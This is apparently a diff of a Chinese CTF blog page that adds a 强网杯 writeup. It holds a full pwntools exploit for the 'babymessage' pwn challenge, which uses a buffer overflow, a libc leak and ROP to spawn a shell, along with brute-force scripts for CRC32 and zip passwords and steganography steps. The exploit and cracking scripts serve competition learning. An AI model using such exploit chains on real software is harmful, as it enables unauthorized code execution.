+	#exec("print v"+str(iml[i][1]))
+#exec("print v"+str(l))
+tmp=sum
+b=int(raw_input("sum:")[:-1],16)
+for i in range(20,130):
+	sum=tmp
+	c="v"+str(l)+"=("+str(i)+"*iml["+str(l)+"][0])&0xffffffff"
+	exec(c)
+	#print v1
+	exec("sum=(sum+v"+str(l)+")&0xffffffff")
+	#print sum
+	if sum == b:
+		print hex(i)
+		f=f+chr(i)
+		break
+print f
+
+</code></pre>
+<p>flag为：flag{g0_Fuck_xx_5egm3nt_0bf}</p>
+<h2 id="PWN">PWN</h2>
+<h3 id="babymessage">babymessage</h3>
+<p>在leave_message函数中有个溢出，但是溢出长度不够覆盖到ret，因此考虑修改rbp，可以修改rbp的低位字节，先ret到start增加mm的大小，溢出长度增加后可以控制ret后就可以ret到0x40098e处修改read的可读字符的长度，之后就是leak libc地址，进行rop来getshell</p>
+<p>exp:</p>
+<pre class=" language-language-python"><code class="language-language-python">#coding=utf-8
+import os
+import sys
+from pwn import *
+#from pwn_debug import *
+from LibcSearcher import *
+context.arch = 'amd64'
+#context.arch = 'i386'
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level='debug'
+
+def init():
+	global p
+	global elf
+	global libc
+	execve = "./babymessage"
+	libc_path = "/lib/x86_64-linux-gnu/libc-2.27.so"
+	mode = "local"
+
+	#libc_path = "/home/user/welpwn/PwnContext/libs/libc-2.27/64bit/libc.so.6"
+	#ld_path = "/home/user/welpwn/PwnContext/libs/libc-2.27/64bit/ld.so.2"
+	#pdbg.local(libc_path, ld_path)
+
+	elf = ELF(execve)
+	if sys.argv[1] == '1':
+		pdbg = pwn_debug(execve)
+		pdbg.local("libc.so.6")
+		pdbg.debug("2.27")
+		p = pdbg.run(mode)
+		libc = pdbg.libc
+	else:
+		p = process(execve)
+		#libc = ELF(libc_path)
+	
+	if sys.argv[2] == '1':
+		gdb.attach(p)
+
+	if sys.argv[1] == '0':
+		ip = "123.56.170.202"
+		port = "21342"
+		p = remote(ip, port)
+
+def pwn():
+	
+	def choice(c):
+		p.sendlineafter("choice:", str(c))
+		
+	def name(n):
+		p.sendlineafter("choice:", '1')
+		
+		p.sendafter("name:", n)
+	
+	def message(m):
+		p.sendlineafter("choice:", '2')
+		
+		p.sendafter("message: \n", m)
+	
+	def show():
+		p.sendlineafter("choice:", '3')
+	
+	name(p32(0) + '\n')
+	message(p64(0x40098E) + '\x58')
+	choice(4)
+	
+	payload = '\x00'*8 + p64(0x6010c0 + 4) + p32(0x40098e)
+	message(payload)
+	
+	pop_rdi = 0x400ac3
+	payload = 'a'*8 + p64(elf.bss() + 0x200) + p64(pop_rdi) + p64(elf.got['puts']) \
+					+ p64(elf.plt['puts']) + p64(0x40098e)
+	p.sendlineafter("message: \n", payload)
+	
+	p.recvline()
+	p.recvline()
+	libc = ELF("./libc-2.27.so")
+	puts = u64(p.recvline()[:-1].ljust(8, '\x00'))
+	libc.address = puts - libc.sym['puts']
+	success("puts -> " + hex(libc.sym['system']))
+	
+	payload = 'a'*8 + p64(elf.bss() + 0x200) + p64(pop_rdi) + p64(libc.search('/bin/sh\0').next()) \
+					+ p64(libc.sym['system'])
+	p.sendlineafter("message: \n", payload)
+	p.interactive()
+	
+if __name__ == '__main__':
+	init()
+	pwn()
+
+</code></pre>
+<h2 id="MISC">MISC</h2>
+<h3 id="问卷调查">问卷调查</h3>
+<p>填完问卷出flag</p>
+<p><img src="https://images-cdn.shimo.im/f62j7Hlz8YDKvga7__thumbnail.png" alt></p>
+<h3 id="签到">签到</h3>
+<p><img src="https://images-cdn.shimo.im/OeMITpgD7K21rtVd__thumbnail.png" alt></p>
+<h3 id="miscstudy">miscstudy</h3>
+<p>C分析流量包，发现访问了一个服务器的web页面，我们也试着访问下</p>
+<p><img src="https://images-cdn.shimo.im/swY1WJAviN4mFBrg__thumbnail.png" alt></p>
+<p>发现第一层flag</p>
+<p><img src="https://images-cdn.shimo.im/jilFTlABGCJ8PaQk__thumbnail.png" alt></p>
+<p>然后百度搜了下前面的字符串，发现是TLS秘钥，然后wireshark可以根据秘钥解密出https协议包的内容。</p>
+<p><img src="https://images-cdn.shimo.im/n9IFtqrtaw6pSy4M__thumbnail.png" alt></p>
+<p>把上面的秘钥复制到文件里，然后直接扔到wireshark里解密</p>
+<p><img src="https://images-cdn.shimo.im/qyTHJ1PkFuqnLgWB__thumbnail.png" alt></p>
+<p>解密出来多了个HTTPS的包</p>
+<p><img src="https://images-cdn.shimo.im/PcdzRz0Ev4F1C3ev__thumbnail.png" alt></p>
+<p>发现是下载一张图片，但没有IEND，也就说这张图片不完整，我们直接自己访问地址去下载一下</p>
+<p><img src="https://images-cdn.shimo.im/sKJWAPJCvIc8JIbK__thumbnail" alt></p>
+<p><img src="https://images-cdn.shimo.im/15XeiEg4ucQnsIAb__thumbnail.png" alt></p>
+<p>hxd打开看了下，发现再图片末尾的data段里有大量的base64字符串</p>
+<p><img src="https://images-cdn.shimo.im/S6nYf0QJ7yFVOHBU__thumbnail.png" alt></p>
+<p>复制出来，存到一个文件里，写脚本解密</p>
+<p><img src="https://images-cdn.shimo.im/clW2MkoRD8etHM3d__thumbnail.png" alt></p>
+<p>在末尾发现第二关flag。其它部分都是0，1，而且二进制又解不出来，就联想到了二维码，1为黑，0为白，然后计算了下01的个数，总共3600，60*60</p>
+<p>脚本如下</p>
+<pre class=" language-language-plain"><code class="language-language-plain">import base64
+from PIL import Image
+f=open("56.txt",'r')
+s=""
+for i in f.read().split('\n'):
+	s=s+base64.b64decode(i)
+print len(s)
+img=Image.new("RGB",(60,60))
+for i in range(0,60):
+	for j in range(0,60):
+		pix=s[i*60+j]
+		if pix == '1' :
+			img.putpixel((i,j),(0,0,0))
+		elif pix == '0':
+			img.putpixel((i,j),(255,255,255))
+img.save("img.png")
+
+</code></pre>
+<p>二维码如下<br>
+<img src="https://images-cdn.shimo.im/bnXTyrOTBmhfLUTp__thumbnail.png" alt></p>
+<p>扫描结果是个百度盘链接，下载下来</p>
+<p>下下来是张图片，jpg的，直接stegdetect分析，发现是jphide隐写</p>
+<p><img src="https://images-cdn.shimo.im/20qpq42FzHFkVsJC__thumbnail.png" alt></p>
+<p>爆破密码</p>
+<p><img src="https://images-cdn.shimo.im/ZATH9gzXt788a7Rr__thumbnail.png" alt></p>
+<p>jphs解密出了第三关flag和一个网盘链接</p>
+<p><img src="https://images-cdn.shimo.im/kAT7dEygCM57a3OY__thumbnail.png" alt></p>
+<p>下下来是个压缩包，解压说level5.png解压失败，然后bandzip打开能直接看到</p>
+<p><img src="https://images-cdn.shimo.im/wsAPmlWlNuO1EDEv__thumbnail" alt></p>
+<p>解压出来有leve6.zip和leve7.zip</p>
+<p>解压leve6.zip需要密码,但看txt大小只有5或4,就crc爆破,下面是爆破脚本</p>
+<pre class=" language-language-plain"><code class="language-language-plain">#coding:utf-8
+import binascii
+import string 
+import zipfile
+dic=string.printable
+def CrackCrc(crc):
+    for i in dic :
+        for j in dic:
+            for p in dic:
+                for q in dic:
+                    for n in dic:
+                        s=i+j+p+q+n
+                        print s
+                        if crc == (binascii.crc32(s.encode()) & 0xffffffff):
+                            print s
+                        #return 
+def getcrc32():
+    l=[]
+    file = "level6.zip"
+    f = zipfile.ZipFile(file,'r')
+    GetCrc1 = f.getinfo('1.txt')
+    crc1 = GetCrc1.CRC
+    GetCrc2 = f.getinfo('2.txt')
+    crc2 = GetCrc2.CRC
+    GetCrc3 = f.getinfo('3.txt')
+    crc3 = GetCrc3.CRC
+    l.append(crc1)
+    l.append(crc2)
+    l.append(crc3)
+    return l
+if __name__  == "__main__":
+    l = getcrc32()
+    for i in l:
+        print i
+        CrackCrc(i)
+
+
+</code></pre>
+<p>爆破出来<br>
+1.txt：level   2.txt：6_is  3.txt：ready   合一起就是level6_isready</p>
+<p>压缩包level7.zip同样有密码,但看到里面的1.png跟外面给的1.png是一样的,想到zip明文攻击</p>
+<p><img src="https://images-cdn.shimo.im/wHGD4IbqDJVE7Ohr__thumbnail.png" alt></p>
+<p><img src="https://images-cdn.shimo.im/Rdg2XQ2CpnsOcg0j__thumbnail.png" alt></p>
+<p>解压出3张图片,后面两张像素一样但字节大小不一样,猜测为盲水印</p>
+<p><img src="https://images-cdn.shimo.im/OJSU370FNSuVGp5W__thumbnail.png" alt></p>
+<p>使用工具解出部分flaglevel7ishere,然后又有一个链接,访问</p>
+<p><img src="https://images-cdn.shimo.im/F3EpQFJ9vzhlGtYr__thumbnail.png" alt></p>
+<p>是一个假的百度,f12看了下源码,发现把flag变成了空白,而且还需要密码,猜测snow隐写</p>
+<p><img src="https://images-cdn.shimo.im/uVlVcMRggxtXo1OO__thumbnail.png" alt></p>
+<p>然后它告诉你需要用密码(),那么括号里有可能就是密码,直接用来解密</p>
+<p><img src="https://images-cdn.shimo.im/k0vGH0Lrr9PwzI1v__thumbnail.png" alt></p>
+<p><img src="https://images-cdn.shimo.im/KyEIhXYaNmBB2Zey__thumbnail.png" alt></p>
+<p>至此,全部flag都解出来了,最终flag为flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaalevel6_isreadylevel7isherethe_misc_examaaaaaaa_!!!}</p>
 
             </div>
             <hr>
@@ -619,7 +937,7 @@ public class Test {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/08/12/XMLDecoder反序列化/">http://yoursite.com/year/08/12/XMLDecoder反序列化/</a>
+                    <a href="http://yoursite.com/year/08/26/强网杯writeup/">http://yoursite.com/year/08/26/强网杯writeup/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1085,7 +1403,62 @@ public class Test {
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/year/08/26/强网杯writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="强网杯writeup">
+                        
+                        <span class="card-title">强网杯writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            一、战队信息
+战队名称：低级CTF团队
+战队排名：63
+二、解题情况
+
+三、解题过程
+强网先锋
+upload
+
+打开流量包发现上传了个图片文件，导出图片。
+根据图片名 steghide可以知道应该是steghide加密，但是不知道密码。
+
+
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/year/08/26/全国大学生信息安全竞赛/">
                     <div class="card-image">
@@ -1115,61 +1488,15 @@ Babyunserialize
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
                             <a href="/categories/CTF/" class="post-category">
                                     CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/year/07/28/java反序列化——fastjson/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="java反序列化——fastjson">
-                        
-                        <span class="card-title">java反序列化——fastjson</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            fastjson反序列化
-环境搭建
-直接到maven的仓库里找对应版本的依赖代码即可
-&lt;dependency&gt;
-    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
-    &lt;art
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/总结记录/" class="post-category">
-                                    总结记录
                                 </a>
                             
                             
